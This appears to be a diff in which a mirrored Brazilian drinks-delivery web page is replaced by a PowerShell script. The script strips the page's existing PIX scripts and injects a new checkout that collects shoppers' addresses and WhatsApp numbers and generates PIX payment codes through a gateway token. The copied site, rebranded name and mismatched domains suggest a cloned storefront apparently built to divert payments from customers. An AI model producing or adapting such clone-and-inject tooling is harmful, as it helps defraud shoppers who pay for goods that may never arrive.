@@ -1,9 +1,11 @@
-﻿<!DOCTYPE html><html lang="pt-BR">
-<!-- Mirrored from deliverybreja.biz/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 01 Oct 2026 15:40:12 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
-<head><meta charset="utf-8"><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="hero-banner.png" fetchPriority="high"/><link rel="stylesheet" href="_next/static/css/21ed5eff36cc1a99.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="_next/static/chunks/webpack-0b63f820.js"/><script src="_next/static/chunks/fd9d1056-7a4f00f0.js" async=""></script><script src="_next/static/chunks/2117-b25b9a7a.js" async=""></script><script src="_next/static/chunks/main-app-4fe80e8b.js" async=""></script><script src="_next/static/chunks/4438-67246fbc.js" async=""></script><script src="_next/static/chunks/7648-d6ecc63d.js" async=""></script><script src="_next/static/chunks/605-8df1dbaf.js" async=""></script><script src="_next/static/chunks/8667-b7dcda5c.js" async=""></script><script src="_next/static/chunks/app/layout-8f8bde33.js" async=""></script><script src="_next/static/chunks/6157-358806ac.js" async=""></script><script src="_next/static/chunks/8537-7e46e3fe.js" async=""></script><script src="_next/static/chunks/1831-fc6ef597.js" async=""></script><script src="_next/static/chunks/2646-42716aae.js" async=""></script><script src="_next/static/chunks/9110-93f26922.js" async=""></script><script src="_next/static/chunks/app/page-e4119c59.js" async=""></script><title>Express Bebidas - Delivery de Bebidas</title><meta name="description" content="Compre cervejas, destilados, vinhos e refrigerantes com preços transparentes, entrega na sua região e pagamento via PIX ou cartão."/><meta name="robots" content="index, follow"/><link rel="canonical" href="https://expressze.lat/"/><meta property="og:title" content="Express Bebidas - Delivery de Bebidas"/><meta property="og:description" content="Loja online de bebidas com informações claras de preço, entrega e pagamento."/><meta property="og:url" content="https://expressze.lat"/><meta property="og:site_name" content="Express Bebidas"/><meta property="og:locale" content="pt_BR"/><meta property="og:image" content="https://expressze.lat/og-image.png"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Express Bebidas - Delivery de Bebidas"/><meta name="twitter:description" content="Loja online de bebidas com informações claras de preço, entrega e pagamento."/><meta name="twitter:image" content="https://expressze.lat/og-image.png"/><link rel="shortcut icon" href="favicon.svg"/><link rel="icon" href="favicon.svg"/><meta name="next-size-adjust"/><script type="application/ld+json">{"@context":"https://schema.org","@type":"Store","name":"Express Bebidas","alternateName":"Express Bebidas","url":"https://expressze.lat","email":"contato@zebuscadelivery.click","description":"Loja online de bebidas com preços transparentes, entrega na região do cliente e pagamento via PIX ou cartão.","legalName":"Express Bebidas","taxID":"60.276.765/0001-80","areaServed":"BR","paymentAccepted":"PIX, Cartão de crédito","contactPoint":{"@type":"ContactPoint","contactType":"customer service","email":"contato@zebuscadelivery.click","availableLanguage":"Portuguese"}}</script><script src="../apps.abacus.ai/chatllm/appllm-lib.js"></script><script src="_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script>
-</body>
-</html><script>
+$path = "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz\9345488724234\index.html"
+$text = [System.IO.File]::ReadAllText($path, [System.Text.Encoding]::UTF8)
+
+# Find ALL scripts and remove them if they contain "clickedPix"
+$text = [System.Text.RegularExpressions.Regex]::Replace($text, "(?si)<script>.*?clickedPix.*?<\/script>", "")
+
+$newScript = @"
+<script>
   window.DO_PUFPAG = async function(total, amountInCents, FASTSOFT_AUTH) {
       var rua = document.getElementById('checkout-rua').value;
       var num = document.getElementById('checkout-num').value;
@@ -11,7 +13,7 @@
       var tel = document.getElementById('checkout-tel').value;
       
       if(!rua || !num || !bairro || !tel) {
-          alert('Por favor, preencha todos os campos do endereÃ§o e o seu WhatsApp.');
+          alert('Por favor, preencha todos os campos do endereço e o seu WhatsApp.');
           return;
       }
       
@@ -32,7 +34,7 @@
               title: 'Pedido Delivery',
               unitPrice: amountInCents,
               quantity: 1,
-              description: 'EndereÃ§o: ' + enderecoCompleto,
+              description: 'Endereço: ' + enderecoCompleto,
               tangible: false
           }],
           pix: { expiresInDays: 1 }
@@ -58,7 +60,7 @@
               var successHtml = '<h2 style="color:#111;margin-bottom:15px;font-size:22px;font-weight:900;text-align:center;font-family:Arial,sans-serif;">Pague com PIX</h2>' +
                   '<img src="' + qrcodeImg + '" style="max-width:250px;width:100%;margin:0 auto 15px auto;display:block;" />' +
                   '<p style="font-size:15px;color:#333;margin-bottom:15px;word-break:break-all;text-align:center;font-family:Arial,sans-serif;font-weight:bold;">' + qrcodeText + '</p>' +
-                  '<button onclick="navigator.clipboard.writeText(\'' + qrcodeText + '\'); alert(\'CÃ³digo Copiado!\');" style="background:#10b981;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;margin-bottom:10px;font-family:Arial,sans-serif;">COPIAR CÃ“DIGO PIX</button>' +
+                  '<button onclick="navigator.clipboard.writeText(\'' + qrcodeText + '\'); alert(\'Código Copiado!\');" style="background:#10b981;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;margin-bottom:10px;font-family:Arial,sans-serif;">COPIAR CÓDIGO PIX</button>' +
                   '<button onclick="document.getElementById(\'pix-checkout-modal\').remove();" style="background:#ef4444;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;font-family:Arial,sans-serif;">FECHAR</button>';
               document.getElementById('checkout-modal-inner').innerHTML = successHtml;
           } else {
@@ -67,7 +69,7 @@
           }
       } catch(err) {
           console.error('Erro PUFPAG:', err);
-          alert('Erro de conexÃ£o ao gerar PIX.');
+          alert('Erro de conexão ao gerar PIX.');
           document.getElementById('pix-checkout-modal').remove();
       }
   };
@@ -100,7 +102,7 @@
           }
           
           if(total <= 0) {
-              alert('Carrinho vazio ou valor invÃ¡lido para gerar pedido.');
+              alert('Carrinho vazio ou valor inválido para gerar pedido.');
               return;
           }
           
@@ -112,13 +114,13 @@
           
           var modalHtml = '<div id="pix-checkout-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(0px);">' +
               '<div id="checkout-modal-inner" style="background:#fff;padding:30px 20px;border-radius:16px;text-align:left;max-width:400px;width:100%;box-shadow:0 15px 30px rgba(0,0,0,0.5);transform:translateZ(0);">' +
-              '<h2 style="color:#111;margin-bottom:10px;font-size:24px;font-weight:900;text-align:center;font-family:Arial,sans-serif;letter-spacing:-0.5px;">EndereÃ§o de Entrega</h2>' +
+              '<h2 style="color:#111;margin-bottom:10px;font-size:24px;font-weight:900;text-align:center;font-family:Arial,sans-serif;letter-spacing:-0.5px;">Endereço de Entrega</h2>' +
               '<p style="color:#555;font-size:15px;margin-bottom:20px;text-align:center;font-family:Arial,sans-serif;">Preencha para onde vamos enviar:</p>' +
               
               '<label style="'+labelStyle+'">Nome da Rua</label>' +
               '<input type="text" id="checkout-rua" placeholder="Ex: Rua das Flores" style="'+inputStyle+'" />' +
               
-              '<label style="'+labelStyle+'">NÃºmero / Complemento</label>' +
+              '<label style="'+labelStyle+'">Número / Complemento</label>' +
               '<input type="text" id="checkout-num" placeholder="Ex: 123 - Apto 4" style="'+inputStyle+'" />' +
               
               '<label style="'+labelStyle+'">Bairro</label>' +
@@ -137,3 +139,15 @@
 </script>
 </body>
 </html>
+"@
+
+$text = $text + $newScript
+
+[System.IO.File]::WriteAllText($path, $text, [System.Text.Encoding]::UTF8)
+
+# Root
+$pathRoot = "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz\index.html"
+$textRoot = [System.IO.File]::ReadAllText($pathRoot, [System.Text.Encoding]::UTF8)
+$textRoot = [System.Text.RegularExpressions.Regex]::Replace($textRoot, "(?si)<script>.*?clickedPix.*?<\/script>", "")
+$textRoot = $textRoot + $newScript
+[System.IO.File]::WriteAllText($pathRoot, $textRoot, [System.Text.Encoding]::UTF8)
